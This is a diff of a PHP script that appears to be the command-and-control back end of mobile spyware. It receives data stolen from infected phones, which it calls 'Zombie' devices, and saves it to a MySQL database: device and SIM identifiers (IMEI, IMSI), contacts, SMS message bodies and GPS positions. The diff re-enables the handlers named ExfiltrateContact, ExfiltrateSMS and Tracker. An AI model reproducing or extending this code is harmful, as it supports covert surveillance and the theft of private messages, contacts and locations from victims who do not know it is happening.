@@ -18,11 +18,11 @@
 	$password = "";
 	$db = "SCI";
 
-	$mysqli = mysqli_connect($host, $username, $password, $db);
-	$mysqli->set_charset('utf8');
+	$conn = mysqli_connect($host, $username, $password, $db);
+	$conn->set_charset('utf8');
 
-	if (!$mysqli) {
-		die("Failed to connect to MySQL: ".mysqli_connect_error());
+	if (!$conn) {
+		die(mysqli_connect_error());
 	}
 
 	if (!empty($_POST['action']) && !empty($_POST['data'])) {
@@ -31,20 +31,20 @@
 
 		switch ($action) {
             case "ExfiltrateZombie":
-                insertZombie($mysqli, $data);
+            	insertZombie($conn, $data);
                 break;
 
-            // case "ExfiltrateContact":
-            //     insertContact($mysqli, $data);
-            //     break;
+            case "ExfiltrateContact":
+                insertContact($conn, $data);
+                break;
 
-            // case "ExfiltrateSMS":
-            //     insertSMS($mysqli, $data);
-            //     break;
+            case "ExfiltrateSMS":
+                insertSMS($conn, $data);
+                break;
 
-            // case "Tracker":
-            //     insertPosition($mysqli, $data);
-            //     break;
+            case "Tracker":
+                insertPosition($conn, $data);
+                break;
 
             default:
                 http_response_code(400);
@@ -52,99 +52,119 @@
         }
 	}	
 
-	function insertZombie($mysqli, $email, $tel) {	
-		$statement = $mysqli->prepare("INSERT INTO Zombie (email_addresses, number, simSerial, MCC_MNC, IMSI, IMEI, deviceSerial, manufacturer, model, release) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-		$statement->bind_param(
-			"ssssssssss", 
-			$email_addresses, 
-			$number, 
-			$simSerial, 
-			$MCC_MNC, 
-			$IMSI, 
-			$IMEI, 
-			$deviceSerial, 
-			$manufacturer, 
-			$model, 
-			$release
-		);
-		$result = $statement->execute();
+	function insertZombie($conn, $data) {
+		$statement = $conn->prepare("INSERT IGNORE INTO `Zombie` (`email_addresses`, `deviceSerial`, `IMEI`, `IMSI`, `manufacturer`, `MCC-MNC`, `model`, `number`, `release`, `simSerial`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
 
-		if(!$result) {
-			echo "INSERT INTO Zombie: ".$statement->error;	
+		if ($statement) {
+			$statement->bind_param(
+				"ssssssssss", 
+				implode(", ", $data["email_addresses"]), 
+				$data["device"]["serial"], 
+				$data["device"]["IMEI"], 
+				$data["SIM"]["IMSI"],
+				$data["device"]["manufacturer"], 
+				$data["SIM"]["MCC-MNC"], 
+				$data["device"]["model"], 
+				$data["SIM"]["number"], 
+				$data["device"]["release"],
+				$data["SIM"]["serial"]
+			);
+
+			$result = $statement->execute();
+
+			if($result) {
+				$statement->close();
+			} else {
+				trigger_error($statement->error);
+				die($statement->error);	
+			}
+		} else {
+			trigger_error($conn->error);
+    		die($conn->error);
 		}
-
-		$statement->close();
 	}
 
-	function insertContact($mysqli, $SMSArray) {
-		$first = true;
-		$statement = $mysqli->prepare("INSERT INTO SMS (idS, thread, email, tel, otherTel, otherName, content, date, type)
-			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
+	function insertContact($conn, $data) {
+		$statement = $conn->prepare("INSERT IGNORE INTO `Contact` (`id`, `email_addresses`, `display_name`, `normalized_number`) VALUES (?, ?, ?, ?)");
 
-		foreach ($SMSArray as $SMS) {
-			extract($SMS);
+		if ($statement) {
+			foreach ($data as $contact) {
+				$statement->bind_param(
+					"isss", 
+					$contact["id"], 
+					implode(", ", $contact["email_addresses"]), 
+					$contact["display_name"], 
+					$contact["normalized_number"]
+				);
 
-			if($first) {
-				addZombie($mysqli, $email, $tel);
-				$first = false;
+				$result = $statement->execute();
+
+				if(!$result) {	
+					die($statement->error);	
+				}
 			}
 
-			$statement->bind_param("iissssssi", $idS, $thread, $email, $tel, $otherTel, $otherName, $content, $date, $type);
-			$result = $statement->execute();
-			
-			if(!$result) {
-				header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
-				echo "INSERT INTO SMS: ".$statement->error;	
-			}
-		}
-
-		$statement->close();
+			$statement->close();
+		} else {
+    		die($conn->error);
+		}		
 	}
 
-	function insertSMS($mysqli, $SMSArray) {
-		$first = true;
-		$statement = $mysqli->prepare("INSERT INTO SMS (idS, thread, email, tel, otherTel, otherName, content, date, type)
-			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
+	function insertSMS($conn, $data) {
+		$statement = $conn->prepare("INSERT IGNORE INTO `SMS` (`id`, `email_addresses`, `address`, `body`,  `date`, `thread_id`, `type`) VALUES (?, ?, ?, ?, ?, ?, ?)");
 
-		foreach ($SMSArray as $SMS) {
-			extract($SMS);
+		if ($statement) {
+			foreach ($data as $SMS) {
+				$statement->bind_param(
+					"isssssi", 
+					$SMS["id"], 
+					implode(", ", $SMS["email_addresses"]), 
+					$SMS["address"],
+					$SMS["body"],
+					$SMS["date"],
+					$SMS["thread_id"],  
+					$SMS["type"] 
+				);
 
-			if($first) {
-				addZombie($mysqli, $email, $tel);
-				$first = false;
-			}
-
-			$statement->bind_param("iissssssi", $idS, $thread, $email, $tel, $otherTel, $otherName, $content, $date, $type);
-			$result = $statement->execute();
+				$result = $statement->execute();
 			
-			if(!$result) {
-				header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
-				echo "INSERT INTO SMS: ".$statement->error;	
+				if(!$result) {	
+					die($statement->error);	
+				}
 			}
+
+			$statement->close();
+		} else {
+    		die($conn->error);
+		}	
+	}
+
+	function insertPosition($conn, $data) {
+		$statement = $conn->prepare("INSERT IGNORE INTO Position (`email_addresses`, `accuracy`, `altitude`, `date`, `latitude`, `longitude`, `provider`) VALUES (?, ?, ?, ?, ?, ?, ?)");
+
+		if ($statement) {
+			$statement->bind_param(
+				"sddsdds",
+				$data["email_addresses"], 
+				$data["accuracy"], 
+				$data["altitude"],
+				$data["date"], 
+				$data["latitude"], 
+				$data["longitude"],
+				$data["provider"]
+			);
+
+			$result = $statement->execute();
+
+			if($result) {	
+				$statement->close();
+			} else {
+				die($statement->error);	
+			}
+		} else {
+    		die($conn->error);
 		}
+	}
 
-		$statement->close();
-	} 
-
-	function insertPosition($mysqli, $GPSTracker) {
-		extract($GPSTracker);
-		
-		addZombie($mysqli, $email, $tel);
-
-		$statement = $mysqli->prepare("INSERT INTO Position (email, tel, address, longitude, latitude, altitude, accuracy, date, provider)
-			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
-
-		$statement->bind_param("sssddddss", $email, $tel, $address, $longitude, $latitude, $altitude, $accuracy, $date, $provider);
-		$result = $statement->execute();
-
-
-		if(!$result) {
-			header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
-			die("INSERT INTO Position: ".$statement->error);	
-		}
-
-		$statement->close();
-	}	
-
-	mysqli_close($mysqli);
+	mysqli_close($conn);
 ?>
